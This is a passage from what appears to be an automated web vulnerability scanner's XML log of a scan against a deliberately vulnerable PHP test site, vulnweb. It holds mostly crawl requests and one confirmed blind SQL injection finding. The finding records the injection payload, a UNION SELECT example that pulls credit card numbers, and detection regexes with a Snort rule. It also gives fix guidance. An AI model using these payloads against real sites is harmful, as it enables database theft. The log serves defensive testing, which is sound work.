</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="EDB58F93E06DA9DADAD1C91F71C08B63";PSID="991928C5937B2E98B55DF77B779F5A58";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="PlainText";NodeName="%23text";Source="StaticParser";tid="53";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c3b846ba";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="8ad4b10d";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[File not found.
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:38 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>16</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A785DE904758556C2D4F9CEF24A1386E"><URL>http://php.vulnweb.com:80/hj/var/www/AJAX/infocateg.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="A785DE904758556C2D4F9CEF24A1386E"><![CDATA[GET /hj/var/www/AJAX/infocateg.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/infocateg.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="A785DE904758556C2D4F9CEF24A1386E";PSID="A19962DA6C0E82DFC2D5D2B40FF01C50";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="DocumentContent";NodeName="iteminfo";Source="StaticParser";SubLocation="XML";tid="33";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="1d327b2d";
X-Request-Memo: ID="e58caa5c";sc="2";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:40 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 16

File not found.
]]></RawResponse><Request id="A785DE904758556C2D4F9CEF24A1386E"><Method>GET</Method><Path>/hj/var/www/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/infocateg.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="A785DE904758556C2D4F9CEF24A1386E";PSID="A19962DA6C0E82DFC2D5D2B40FF01C50";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="DocumentContent";NodeName="iteminfo";Source="StaticParser";SubLocation="XML";tid="33";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="1d327b2d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="e58caa5c";sc="2";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[File not found.
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:40 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>16</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="5DE7FF8274411419FACF3ADFA2470AB5"><URL>http://php.vulnweb.com:80/hj/var/www/AJAX/infoartist.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="5DE7FF8274411419FACF3ADFA2470AB5"><![CDATA[GET /hj/var/www/AJAX/infoartist.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/infoartist.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="5DE7FF8274411419FACF3ADFA2470AB5";PSID="8C8A2ED0B1865A85196EE48C7C6ED8C5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="DocumentContent";NodeName="iteminfo";Source="StaticParser";SubLocation="XML";tid="73";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="f389777f";
X-Request-Memo: ID="70d82d08";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:45 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 16

File not found.
]]></RawResponse><Request id="5DE7FF8274411419FACF3ADFA2470AB5"><Method>GET</Method><Path>/hj/var/www/AJAX/</Path><File>infoartist</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/infoartist.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="5DE7FF8274411419FACF3ADFA2470AB5";PSID="8C8A2ED0B1865A85196EE48C7C6ED8C5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="DocumentContent";NodeName="iteminfo";Source="StaticParser";SubLocation="XML";tid="73";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="f389777f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="70d82d08";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[File not found.
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:45 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>16</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="CD138B3326CD322D96579996DA24B941"><URL>http://php.vulnweb.com:80/AJAX/infoartist.php?id=2%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>id</AttackParamDescriptor><Issues><Issue id="b62cd72a-1327-4f9e-8093-5bc5763f0254"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[GET /AJAX/infoartist.php?id=2%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="CD138B3326CD322D96579996DA24B941";PSID="181D133EFA654D97CBA7C796FEAB7364";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="2%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="45";tt="40";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="047b8af9";
X-Request-Memo: ID="73dfee04";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11299</VulnerabilityID><Severity>4</Severity><Name>Blind SQL Injection (Confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<hp-img src="sql.rgc" /><br /><drc_sqli />


Critical Blind SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. Normal SQL Injection attacks depend in a large measure on an attacker reverse engineering portions of the original SQL query using information gained from error messages.  However, your application can still be susceptible to Blind SQL injection even if no error message is displayed.  If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="CD138B3326CD322D96579996DA24B941"><![CDATA[GET /AJAX/infoartist.php?id=2%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="CD138B3326CD322D96579996DA24B941";PSID="181D133EFA654D97CBA7C796FEAB7364";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="2%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="45";tt="40";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="047b8af9";
X-Request-Memo: ID="73dfee04";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:48 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 23

<iteminfo></iteminfo>
]]></RawResponse><Request id="CD138B3326CD322D96579996DA24B941"><Method>GET</Method><Path>/AJAX/</Path><File>infoartist</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=2%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>2%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="CD138B3326CD322D96579996DA24B941";PSID="181D133EFA654D97CBA7C796FEAB7364";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="2%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="45";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="39";smi="0";sc="1";ID="047b8af9";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="73dfee04";sc="1";tid="45";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo></iteminfo>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:48 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>23</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="DEF752D0BB9EFF560CDBB1A2C40CD018"><URL>http://php.vulnweb.com:80/search.php?test=query</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>searchFor</AttackParamDescriptor><Issues><Issue id="27bc46c5-7b39-4c32-b734-3fd805423054"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /search.php?test=query HTTP/1.1
Referer: http://php.vulnweb.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
